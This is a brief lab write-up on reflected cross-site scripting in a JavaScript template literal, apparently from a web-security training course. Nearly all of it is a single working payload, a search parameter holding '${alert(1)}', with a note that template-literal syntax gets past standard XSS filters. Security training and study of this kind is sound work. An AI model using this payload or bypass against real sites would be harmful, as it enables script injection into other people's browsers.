# Lab 21 — Reflected XSS in JS Template Literal (PRACTITIONER)

## Payload
```
/search?search=${alert(1)}
```
`${}` syntax in template literals is unaffected by standard XSS filters.
